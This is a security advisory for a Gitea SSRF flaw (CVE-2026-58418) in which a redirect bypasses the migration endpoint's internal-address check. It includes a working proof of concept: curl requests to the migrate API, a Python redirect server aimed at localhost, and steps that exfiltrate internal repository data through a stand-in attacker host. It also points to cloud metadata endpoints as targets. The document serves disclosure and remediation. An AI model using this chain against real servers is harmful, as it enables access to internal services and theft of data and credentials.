# [M] Gitea: SSRF via HTTP Redirect in Repository Migration

## Summary
Severity: Medium
Advisory: GHSA-rqhx-647v-wx32
CVE: CVE-2026-58418
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-rqhx-647v-wx32
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.26.4

## Details
## Summary

Gitea 1.25.4 validates the initial URL provided to the repository migration endpoint (`POST /api/v1/repos/migrate`) and correctly blocks requests to internal addresses like `127.0.0.1` or RFC1918 ranges. However, if the initial URL points to an attacker-controlled server that responds with an HTTP 302 redirect to an internal address, Gitea follows the redirect without performing a second validation. This allows a low-privilege user to reach internal services through Gitea as a proxy.

## Affected Version

Gitea 1.25.4 (latest stable at time of writing), default configuration.

## Prerequisites

1. A regular Gitea user account (no admin privileges required)
2. An attacker-controlled server reachable from the internet that serves HTTP 302 redirects

## Reproduction

### Environment

| Role             | Location                                                       | Network                                  |
|------------------|----------------------------------------------------------------|------------------------------------------|
| Attacker         | Any machine with internet access                               | External network (VLAN A)                |
| Gitea Server     | Windows 11 VM, Gitea 1.25.4, default config, SQLite           | Internal network (VLAN B)                |
| Internal service | Same VM, bound to `127.0.0.1:18082`                           | Localhost only                           |
| Redirect server  | Attacker-controlled public server, port 18080                 | Internet                                 |

The attacker can reach Gitea on port 3000 but cannot reach port 18082 on the VM. This was verified by attempting a direct connection, which was refused.

### Step 1: Create an attacker account on Gitea

Register a normal user account on the Gitea instance (or use any existing non-admin account). Then generate an API token under **Settings > Applications** with the `repo: write` scope. The migration endpoint requires this because it creates a new repository. This token is referenced as `<USER_TOKEN>` in the steps below.

### Step 2: Set up an internal service on the Gitea host

On the Gitea VM, create a bare Git repository that simulates an internal service:

```bash
mkdir C:\internal-repo
cd C:\internal-repo
git init
echo CONFIDENTIAL_DATA_2025 > secret.txt
git add .
git commit -m "internal confidential"
git clone --bare . C:\internal.git
cd C:\internal.git
git update-server-info
python -m http.server 18082 --bind 127.0.0.1
```

This serves a Git repository on localhost port 18082. It is not reachable from outside the machine.

### Step 3: Confirm Gitea blocks direct access to internal addresses

From the attacker machine:

```bash
curl -X POST http://<GITEA_SERVER>:3000/api/v1/repos/migrate \
  -H "Authorization: token <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "clone_addr": "http://127.0.0.1:18082/",
    "repo_name": "direct-test",
    "service": "git"
  }'
```

Response:

```json
{"message":"You can not import from disallowed hosts."}
```

This confirms that Gitea correctly blocks migration from internal addresses when provided directly.

### Step 4: Set up a redirect server

On an attacker-controlled public server, run a script that redirects all requests to the internal service:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        if path.startswith("/repo.git"):
            path = path[len("/repo.git"):]
        target = f"http://127.0.0.1:18082{path}"
        self.send_response(302)
        self.send_header("Location", target)
        self.end_headers()
        print(f"[+] Redirected {self.path} -> {target}")

    do_HEAD = do_GET

HTTPServer(("0.0.0.0", 18080), RedirectHandler).serve_forever()
```

### Step 5: Exploit the redirect bypass

From the attacker machine:

```bash
curl -X POST http://<GITEA_SERVER>:3000/api/v1/repos/migrate \
  -H "Authorization: token <USER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "clone_addr": "http://<ATTACKER_SERVER>:18080/repo.git",
    "repo_name": "exfil-test",
    "service": "git",
    "private": true
  }'
```

Response: **HTTP 201 Created**. The migration succeeds.

### Step 6: Retrieve the exfiltrated data

From the attacker machine:

```bash
git clone http://attacker:password@<GITEA_SERVER>:3000/attacker/exfil-test.git
cat exfil-test/secret.txt
```

Output:

```text
CONFIDENTIAL_DATA_2025
```

The attacker now has the contents of the internal repository that was only accessible on localhost.

## What happens during the attack

1. The attacker sends a migration request pointing to their public server.
2. Gitea validates the URL. The destination is a public IP, so it passes the check.
3. Gitea contacts the attacker's server to clone the repository.
4. The attacker's server responds with `302 Location: http://127.0.0.1:18082/...`
5. Gitea follows the redirect to `127.0.0.1` without validating the new destination.
6. The internal service responds and Gitea stores the result as a new repository owned by the attacker.
7. The attacker clones their newly created repository and reads the internal data.

## Impact

Any authenticated user with permission to create repositories can use the migration feature to reach services that are only accessible from the Gitea server itself or its local network. Depending on the environment this could include:

1. Internal Git repositories or other version control systems not exposed to the internet
2. Cloud metadata endpoints (`169.254.169.254`) which serve temporary credentials on AWS, GCP, and Azure
3. Internal APIs, CI/CD systems, databases, or admin panels bound to localhost or private networks
4. Other services within the same network segment that trust connections from the Gitea server

The full content of internal Git repositories can be exfiltrated as demonstrated above. For non-Git services, the request still reaches the target (blind SSRF), which may be enough to trigger actions or leak information through error messages.

## Suggested Fix

Validate the destination of HTTP redirects against the same blocklist that is applied to the initial URL. If a redirect points to a blocked address (loopback, link-local, RFC1918), the request should be aborted before following the redirect.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-rqhx-647v-wx32
- https://nvd.nist.gov/vuln/detail/CVE-2026-58418
- https://github.com/go-gitea/gitea/pull/38108
- https://github.com/go-gitea/gitea/commit/9e84deb969aff5c1115c2984e41250f28c78451f
- https://blog.gitea.com/release-of-1.26.3-and-1.26.4
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.26.4
